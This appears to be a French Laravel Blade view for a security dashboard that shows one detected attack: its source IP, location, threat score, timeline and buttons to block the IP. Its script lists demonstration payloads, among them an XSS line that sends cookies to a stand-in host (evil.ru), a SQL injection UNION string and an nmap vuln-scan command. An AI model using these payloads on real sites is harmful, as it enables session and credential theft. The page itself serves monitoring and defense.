@extends('layouts.app')
@section('title', 'Détail Attaque #' . $attack->id)
@section('page-title', '🔍 Analyse Attaque #' . $attack->id)

@push('styles')
<style>
.detail-grid { display: grid; grid-template-columns: 1fr 360px; gap: 20px; }
.info-block {
    background: var(--bg-secondary);
    border-radius: 8px;
    padding: 16px;
    margin-bottom: 12px;
}
.info-row {
    display: flex;
    justify-content: space-between;
    align-items: flex-start;
    padding: 8px 0;
    border-bottom: 1px solid rgba(26,58,92,0.4);
    font-size: 13px;
    gap: 12px;
}
.info-row:last-child { border-bottom: none; }
.info-key   { color: var(--text-muted); font-family: 'Share Tech Mono', monospace; font-size: 11px; min-width: 130px; }
.info-val   { color: var(--text-primary); text-align: right; font-weight: 600; }
.timeline-item {
    display: flex; gap: 12px; padding: 10px 0;
    border-left: 2px solid var(--border);
    padding-left: 16px;
    margin-left: 8px;
    position: relative;
}
.timeline-item::before {
    content: '';
    width: 10px; height: 10px;
    border-radius: 50%;
    background: var(--accent-cyan);
    position: absolute;
    left: -6px; top: 14px;
}
.payload-box {
    background: var(--bg-primary);
    border: 1px solid var(--border);
    border-radius: 6px;
    padding: 14px;
    font-family: 'Share Tech Mono', monospace;
    font-size: 12px;
    color: var(--accent-green);
    max-height: 160px;
    overflow-y: auto;
    white-space: pre-wrap;
    word-break: break-all;
}
.threat-score {
    background: conic-gradient(var(--score-color) var(--score-deg), rgba(26,58,92,0.5) 0deg);
    width: 120px; height: 120px;
    border-radius: 50%;
    display: flex; align-items: center; justify-content: center;
    position: relative;
    margin: 0 auto 12px;
}
.threat-score::before {
    content: '';
    position: absolute;
    width: 90px; height: 90px;
    border-radius: 50%;
    background: var(--bg-card);
}
.threat-score-val {
    font-family: 'Rajdhani', sans-serif;
    font-size: 28px;
    font-weight: 700;
    z-index: 1;
    color: var(--score-color);
}
</style>
@endpush

@section('content')

<!-- Header breadcrumb -->
<div style="display:flex; align-items:center; gap:10px; margin-bottom:20px;">
    <a href="{{ route('attacks.index') }}" class="btn btn-primary btn-sm">
        <i class="fas fa-arrow-left"></i> Retour
    </a>
    <span class="badge badge-{{ $attack->severity }}" style="font-size:14px; padding:6px 12px;">
        {{ $attack->severity_icon }} {{ strtoupper($attack->severity) }}
    </span>
    @if($attack->is_simulation)
    <span class="badge" style="background:rgba(168,85,247,0.15);color:#a855f7;border-color:#a855f7;font-size:13px;">⚗️ SIMULATION</span>
    @endif
    @if($attack->status === 'blocked')
    <span class="badge badge-low" style="font-size:13px;">🛡️ BLOQUÉE</span>
    @else
    <button class="btn btn-danger btn-sm" id="block-btn" onclick="blockThis({{ $attack->id }})">
        <i class="fas fa-ban"></i> Bloquer cette IP
    </button>
    @endif
</div>

<div class="detail-grid">
    <!-- Colonne principale -->
    <div>
        <!-- Info principale -->
        <div class="card" style="margin-bottom:16px;">
            <div style="display:flex; align-items:center; gap:16px; margin-bottom:20px;">
                <div style="font-size:48px;">{{ $attack->type_icon }}</div>
                <div>
                    <div style="font-family:'Rajdhani',sans-serif; font-size:28px; font-weight:700;">{{ $attack->type }}</div>
                    <div style="font-family:'Share Tech Mono',monospace; font-size:12px; color:var(--text-muted);">
                        Détectée {{ $attack->created_at->diffForHumans() }} • ID #{{ $attack->id }}
                    </div>
                </div>
            </div>

            <div class="info-block">
                <div class="info-row">
                    <span class="info-key">IP Source</span>
                    <span class="info-val"><span class="ip-addr" style="font-size:14px;">{{ $attack->source_ip }}</span></span>
                </div>
                <div class="info-row">
                    <span class="info-key">Localisation</span>
                    <span class="info-val">🌍 {{ $attack->city }}, {{ $attack->country }}</span>
                </div>
                <div class="info-row">
                    <span class="info-key">Fournisseur (ISP)</span>
                    <span class="info-val">{{ $attack->isp ?? 'Inconnu' }}</span>
                </div>
                <div class="info-row">
                    <span class="info-key">Coordonnées GPS</span>
                    <span class="info-val mono" style="font-size:12px;">{{ $attack->latitude }}, {{ $attack->longitude }}</span>
                </div>
                <div class="info-row">
                    <span class="info-key">IP Cible</span>
                    <span class="info-val"><span class="ip-addr">{{ $attack->target_ip }}</span>:{{ $attack->target_port }}</span>
                </div>
                <div class="info-row">
                    <span class="info-key">Protocole</span>
                    <span class="info-val">{{ $attack->protocol }}</span>
                </div>
                <div class="info-row">
                    <span class="info-key">Paquets reçus</span>
                    <span class="info-val" style="color:var(--accent-cyan);">{{ number_format($attack->packet_count) }}</span>
                </div>
                <div class="info-row">
                    <span class="info-key">Bande passante</span>
                    <span class="info-val" style="color:var(--accent-orange);">{{ $attack->bandwidth_mbps }} Mbps</span>
                </div>
            </div>

            @if($attack->description)
            <div style="margin-top:12px;">
                <div style="font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--text-muted); margin-bottom:6px;">DESCRIPTION</div>
                <div style="font-size:13px; color:var(--text-primary); line-height:1.6; padding:12px; background:rgba(0,229,255,0.04); border-radius:6px; border-left:3px solid var(--accent-cyan);">
                    {{ $attack->description }}
                </div>
            </div>
            @endif
        </div>

        <!-- Payload simulé -->
        <div class="card" style="margin-bottom:16px;">
            <div class="section-title" style="margin-bottom:14px;">📦 Payload / Signature d'Attaque</div>
            <div class="payload-box" id="payload-display">{{ $attack->payload ?? '' }}</div>
            <button class="btn btn-primary btn-sm" style="margin-top:10px;" onclick="generatePayload('{{ $attack->type }}')">
                <i class="fas fa-sync"></i> Générer payload de démonstration
            </button>
        </div>

        <!-- Timeline -->
        <div class="card">
            <div class="section-title" style="margin-bottom:14px;">📅 Timeline</div>
            <div class="timeline-item">
                <div>
                    <div style="font-weight:600; margin-bottom:2px;">Attaque détectée</div>
                    <div style="font-size:12px; color:var(--text-muted);">{{ $attack->created_at->format('d/m/Y H:i:s') }}</div>
                </div>
            </div>
            <div class="timeline-item" style="border-left-color: var(--accent-orange);">
                <div>
                    <div style="font-weight:600; margin-bottom:2px;">Analyse automatique lancée</div>
                    <div style="font-size:12px; color:var(--text-muted);">{{ $attack->created_at->addSeconds(2)->format('d/m/Y H:i:s') }}</div>
                </div>
            </div>
            @if($attack->alarm_triggered)
            <div class="timeline-item" style="border-left-color: var(--accent-red);">
                <div>
                    <div style="font-weight:600; margin-bottom:2px;">🔊 Alarme sonore déclenchée</div>
                    <div style="font-size:12px; color:var(--text-muted);">{{ $attack->created_at->addSeconds(3)->format('d/m/Y H:i:s') }}</div>
                </div>
            </div>
            @endif
            @if($attack->status === 'blocked')
            <div class="timeline-item" style="border-left-color: var(--accent-green);">
                <div>
                    <div style="font-weight:600; margin-bottom:2px;">🛡️ IP bloquée</div>
                    <div style="font-size:12px; color:var(--text-muted);">{{ $attack->updated_at->format('d/m/Y H:i:s') }}</div>
                </div>
            </div>
            @endif
        </div>
    </div>

    <!-- Colonne droite -->
    <div>
        <!-- Score de menace -->
        <div class="card" style="margin-bottom:16px; text-align:center;">
            <div class="section-title" style="margin-bottom:16px; justify-content:center;">Score de Menace</div>
            @php
                $score = match($attack->severity) {
                    'critical' => 95, 'high' => 75, 'medium' => 50, 'low' => 25, default => 40
                };
                $scoreColor = match($attack->severity) {
                    'critical' => '#ff0040', 'high' => '#ff6b00', 'medium' => '#ffd600', 'low' => '#00ff88', default => '#00e5ff'
                };
                $deg = ($score / 100) * 360;
            @endphp
            <div class="threat-score" style="--score-color:{{ $scoreColor }}; --score-deg:{{ $deg }}deg;">
                <div class="threat-score-val">{{ $score }}</div>
            </div>
            <div style="font-size:20px; font-weight:700; color:{{ $scoreColor }};">{{ strtoupper($attack->severity) }}</div>
            <div style="font-size:12px; color:var(--text-muted); margin-top:4px;">Score /100</div>
        </div>

        <!-- Géoloc -->
        <div class="card" style="margin-bottom:16px;">
            <div class="section-title" style="margin-bottom:14px;">📍 Localisation</div>
            <div style="
                height: 160px;
                background: var(--bg-secondary);
                border-radius: 8px;
                display: flex; align-items: center; justify-content: center;
                position: relative; overflow: hidden; margin-bottom:12px;
            ">
                <svg viewBox="0 0 300 160" style="width:100%;height:100%;" xmlns="http://www.w3.org/2000/svg">
                    <rect width="300" height="160" fill="#050a0f"/>
                    <g stroke="rgba(0,229,255,0.06)" stroke-width="0.5">
                        @for($i=0;$i<6;$i++)
                        <line x1="{{ $i*50 }}" y1="0" x2="{{ $i*50 }}" y2="160"/>
                        @endfor
                        @for($i=0;$i<4;$i++)
                        <line x1="0" y1="{{ $i*40 }}" x2="300" y2="{{ $i*40 }}"/>
                        @endfor
                    </g>
                    <!-- Marqueur attaquant -->
                    <circle cx="150" cy="80" r="8" fill="{{ $scoreColor }}" opacity="0.9"/>
                    <circle cx="150" cy="80" r="8" fill="none" stroke="{{ $scoreColor }}" stroke-width="1.5" opacity="0.5">
                        <animate attributeName="r" from="8" to="25" dur="1.5s" repeatCount="indefinite"/>
                        <animate attributeName="opacity" from="0.5" to="0" dur="1.5s" repeatCount="indefinite"/>
                    </circle>
                    <text x="160" y="76" font-family="Share Tech Mono" font-size="9" fill="{{ $scoreColor }}">{{ $attack->source_ip }}</text>
                    <text x="160" y="88" font-family="Share Tech Mono" font-size="8" fill="rgba(255,255,255,0.4)">{{ $attack->city }}</text>
                </svg>
            </div>

            <div style="font-size:12px; display:grid; gap:6px;">
                <div style="display:flex; justify-content:space-between;">
                    <span style="color:var(--text-muted);">Pays</span>
                    <strong>{{ $attack->country }}</strong>
                </div>
                <div style="display:flex; justify-content:space-between;">
                    <span style="color:var(--text-muted);">Ville</span>
                    <strong>{{ $attack->city }}</strong>
                </div>
                <div style="display:flex; justify-content:space-between;">
                    <span style="color:var(--text-muted);">ISP</span>
                    <strong>{{ $attack->isp }}</strong>
                </div>
                <div style="display:flex; justify-content:space-between;">
                    <span style="color:var(--text-muted);">Lat / Lon</span>
                    <strong class="mono" style="font-size:11px;">{{ $attack->latitude }}, {{ $attack->longitude }}</strong>
                </div>
            </div>
        </div>

        <!-- Actions -->
        <div class="card">
            <div class="section-title" style="margin-bottom:14px;">⚡ Actions Défensives</div>
            <div style="display:grid; gap:8px;">
                @if($attack->status !== 'blocked')
                <button class="btn btn-danger" style="justify-content:center;" id="block-btn-side" onclick="blockThis({{ $attack->id }})">
                    <i class="fas fa-ban"></i> Bloquer IP {{ $attack->source_ip }}
                </button>
                @endif
                <button class="btn btn-warning" style="justify-content:center;" onclick="triggerAlarm('{{ $attack->severity }}')">
                    <i class="fas fa-volume-up"></i> Tester Alarme
                </button>
                <a href="{{ route('geo.trace', $attack->source_ip) }}" class="btn btn-primary" style="justify-content:center;">
                    <i class="fas fa-crosshairs"></i> Tracer l'Attaquant
                </a>
                <a href="{{ route('attacks.index') }}" class="btn btn-sm" style="justify-content:center; background:rgba(0,229,255,0.05); color:var(--text-muted); border:1px solid var(--border);">
                    <i class="fas fa-list"></i> Toutes les attaques
                </a>
            </div>
        </div>
    </div>
</div>
@endsection

@push('scripts')
<script>
const payloads = {
    'DDoS':          'UDP FLOOD | Size: 1400B | Rate: 45000pps\nSrc: SPOOFED | Protocol: UDP/53,80,443\n[SYN][SYN][SYN][SYN]... (repeated x100000)',
    'SQL Injection':  "GET /login?id=1' OR '1'='1' --\nUser-Agent: sqlmap/1.7.8\nPayload: 1 UNION SELECT username,password FROM users--",
    'XSS':           "<script>document.cookie='session='+btoa(document.cookie);\nnew Image().src='http://evil.ru/steal?c='+encodeURIComponent(document.cookie)\n</scr"+"ipt>",
    'Brute Force':   "POST /wp-login.php HTTP/1.1\nContent: log=admin&pwd=password123\nAttempts: 547/min | Dict: rockyou.txt\n[FAILED][FAILED][FAILED]...",
    'Port Scan':     "NMAP SCAN DETECTED\nnmap -sS -sV -O -p- --script vuln 10.0.0.1\nPorts found: 22/SSH 80/HTTP 443/HTTPS 3306/MySQL",
    'Ransomware':    "BEHAVIOR DETECTED: Mass file encryption\nExtension: .locked | Files: 2847\nC2: 185.220.101.x | Key: RSA-4096",
    'MITM':          "ARP POISONING DETECTED\nReal GW: aa:bb:cc:dd:ee:ff\nFake GW: 11:22:33:44:55:66\nSSL STRIP attempt on port 443",
};

function generatePayload(type) {
    const p = payloads[type] || `ATTACK SIGNATURE [${type}]\nTimestamp: ${new Date().toISOString()}\nPayload: ENCRYPTED/OBFUSCATED DATA`;
    document.getElementById('payload-display').textContent = p;
}

generatePayload('{{ $attack->type }}');

async function blockThis(id) {
    const btns = document.querySelectorAll('#block-btn, #block-btn-side');
    btns.forEach(b => { b.disabled = true; b.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Blocage...'; });
    const res  = await csrfFetch(`/attacks/block/${id}`, { method: 'POST' });
    const data = await res.json();
    if (data.success) {
        showToast('🛡️ IP Bloquée!', data.message, 'low');
        btns.forEach(b => { b.style.background='rgba(0,255,136,0.1)'; b.style.color='var(--accent-green)'; b.innerHTML='✅ Bloquée'; });
    }
}

// Auto-alarm si critique
@if($attack->severity === 'critical' && $attack->status !== 'blocked')
document.addEventListener('click', function once() {
    triggerAlarm('critical');
    document.removeEventListener('click', once);
}, { once: true });
@endif
</script>
@endpush
